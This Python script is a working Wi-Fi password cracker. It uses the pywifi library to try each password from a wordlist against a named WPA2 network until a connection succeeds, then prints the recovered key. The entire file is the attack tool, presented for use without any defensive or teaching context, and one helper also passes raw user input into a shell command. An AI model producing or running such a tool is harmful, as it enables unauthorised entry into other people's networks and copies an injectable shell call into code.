import argparse
import sys , os , os.path , platform
import re
import time
import pywifi
from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile

def old():
    name_of_router = input('Enter Name/SSID of the Wifi Network you wish to connect to: ')

    try:
        x=os.system(f'''cmd /c "netsh wlan connect name={name_of_router}"''')
        out=int(str(x).strip())
        if out<1:
            print("Connected")
            return True
        else:
            print("Not connected")
            return False
    except Exception as e:
        print("ERROR:",e)

def wyfy():
    client_ssid = input("SSID(name) of network:")
    path_to_file = "wordlist_wifi.txt"
    time.sleep(2)
    print(" ")
    time.sleep(3.5)
    print("Accurate-Higher chance of cracking on special networks but time consuming (best if network connectivity is low)")
    time.sleep(1)
    print("Fast-Faster that Accurate mode (best if network connectivity is high)")
    time.sleep(2.5)
    type=input("Accurate/Fast:").strip().lower()

    RED   = "\033[1;31m"
    BLUE  = "\033[1;34m"
    CYAN  = "\033[1;36m"
    GREEN = "\033[0;32m"
    RESET = "\033[0;0m"
    BOLD    = "\033[;1m"
    REVERSE = "\033[;7m"

    if "acc" in type:
        time_of_sleep=2
        print(BOLD,"MAY TAKE A LONG TIME (best if network connectivity is low)")
        time.sleep(5)
    else:
        time_of_sleep=0.2
        print(BOLD,"MAY NOT WORK ON SOME NETWORKS (best if network connectivity is good)")
        time.sleep(5)

    try:
        # Interface information
        wifi = PyWiFi()
        ifaces = wifi.interfaces()[0]  # for wifi we use index - 0

        ifaces.scan() #check the card
        results = ifaces.scan_results() #Obtain the results of the previous triggerred scan. A Profile list will be returned.


        wifi = pywifi.PyWiFi() # A Profile is the settings of the AP we want to connect to
        iface = wifi.interfaces()[0]

    except:
        print("[-] Error system")

    type = False

    def main(ssid, password, number):

        profile = Profile()  # create profile instance
        profile.ssid = ssid  #name of client
        profile.auth = const.AUTH_ALG_OPEN # auth algo
        profile.akm.append(const.AKM_TYPE_WPA2PSK) # key management
        profile.cipher = const.CIPHER_TYPE_CCMP #type of cipher


        profile.key = password
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        time.sleep(time_of_sleep)
        iface.connect(tmp_profile)
        time.sleep(0.35)

        if ifaces.status() == const.IFACE_CONNECTED:
            time.sleep(1)
            print(BOLD, GREEN,'[*] Crack success!',RESET)
            print(BOLD, GREEN,'[*] password is ' + password, RESET)
            time.sleep(1)
            exit()
        else:
            print(RED, '[{}] Crack Failed using {}'.format(number, password))
    def pwd(ssid, file):
        number = 0
        with open(file, 'r', encoding='utf8') as words:
            for line in words:
                number += 1
                line = line.split("\n")
                pwd = line[0]
                main(ssid, pwd, number)



    def menu(client_ssid,path_to_file):
        parser = argparse.ArgumentParser(description='argparse Example')
        parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
        parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list ...')

        print()

        args = parser.parse_args()
        print(CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
        time.sleep(1.5)
        if args.wordlist and args.ssid:
            ssid = args.ssid
            filee = args.wordlist
        else:
            print(BLUE)
            ssid = client_ssid
            filee = path_to_file


        # breaking
        if os.path.exists(filee):
            if platform.system().startswith("Win" or "win"):
                os.system("cls")
            else:
                os.system("clear")

            print(BLUE,"[~] Cracking...")
            pwd(ssid, filee)

        else:
            print(RED,"[-] No Such File.",BLUE)
    menu(client_ssid , path_to_file)

wyfy()
